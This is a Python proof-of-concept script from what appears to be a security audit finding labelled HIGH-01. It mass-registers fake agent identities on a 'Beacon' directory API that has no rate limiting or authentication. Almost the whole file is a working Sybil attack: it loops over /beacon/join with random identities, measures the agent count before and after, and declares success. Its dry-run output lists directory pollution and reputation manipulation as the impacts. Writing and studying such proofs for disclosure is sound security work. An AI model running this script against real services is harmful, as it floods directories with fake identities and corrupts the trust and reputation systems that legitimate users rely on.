#!/usr/bin/env python3
"""
PoC: Sybil Army — Mass Agent Registration (HIGH-01)

Demonstrates that an attacker can register unlimited fake agents
with no rate limiting, proof-of-work, or authentication.

Usage (against testnet only):
    python attack_03_sybil_army.py --count 100 --url http://localhost:5000
"""

import argparse
import hashlib
import json
import os
import sys
import time
from urllib.request import Request, urlopen


def generate_agent():
    """Generate a random agent identity."""
    privkey = os.urandom(32)
    pubkey = hashlib.sha256(privkey).digest()
    agent_id = f"bcn_{hashlib.sha256(pubkey).hexdigest()[:12]}"
    return agent_id, pubkey.hex()


def register_agent(base_url, agent_id, pubkey_hex, name=None):
    """Register a new agent — no auth required."""
    url = f"{base_url}/beacon/join"
    payload = json.dumps({
        "agent_id": agent_id,
        "pubkey_hex": pubkey_hex,
        "name": name or f"sybil-{agent_id[:8]}",
    }).encode()
    req = Request(url, data=payload, headers={"Content-Type": "application/json"})
    try:
        with urlopen(req, timeout=10) as resp:
            return json.loads(resp.read())
    except Exception as e:
        return {"error": str(e)}


def count_agents(base_url):
    """Count current agents in directory."""
    url = f"{base_url}/beacon/atlas"
    try:
        req = Request(url, headers={"Accept": "application/json"})
        with urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read())
            if isinstance(data, list):
                return len(data)
            if isinstance(data, dict) and "agents" in data:
                return len(data["agents"])
    except Exception:
        pass
    return -1


def main():
    parser = argparse.ArgumentParser(description="PoC: Sybil Army Registration")
    parser.add_argument("--count", type=int, default=10, help="Number of fake agents")
    parser.add_argument("--url", default="http://localhost:5000", help="Beacon API base URL")
    parser.add_argument("--dry-run", action="store_true", help="Only show what would happen")
    args = parser.parse_args()

    if args.dry_run:
        print(f"[DRY RUN] Sybil Army Attack Plan:")
        print(f"  Agents to register: {args.count}")
        print(f"  Target: {args.url}/beacon/join")
        print(f"  Rate limiting: NONE")
        print(f"  Auth required: NONE")
        print(f"  Estimated time: {args.count * 0.05:.1f} seconds")
        print(f"\n  Impact:")
        print(f"    - {args.count} fake agents pollute the directory")
        print(f"    - Each can then inflate trust via bounty completion")
        print(f"    - Coordinated voting/reputation attacks possible")
        print(f"    - Legitimate agents buried in noise")
        return

    print(f"[*] Registering {args.count} Sybil agents...")
    
    before = count_agents(args.url)
    print(f"[*] Agents before attack: {before}")
    
    start = time.time()
    success = 0
    for i in range(args.count):
        agent_id, pubkey = generate_agent()
        result = register_agent(args.url, agent_id, pubkey)
        if result.get("ok"):
            success += 1
        if (i + 1) % 10 == 0:
            print(f"  [{i+1}/{args.count}] Registered {success} agents...")
    
    elapsed = time.time() - start
    after = count_agents(args.url)
    
    print(f"\n[*] Results:")
    print(f"  Successful registrations: {success}/{args.count}")
    print(f"  Time elapsed: {elapsed:.2f}s")
    print(f"  Rate: {success/elapsed:.1f} agents/second")
    print(f"  Agents before: {before}")
    print(f"  Agents after: {after}")
    
    if success > 0:
        print(f"\n[!!!] CONFIRMED: Sybil attack successful")
        print(f"[!!!] No rate limiting or authentication prevented mass registration")


if __name__ == "__main__":
    main()
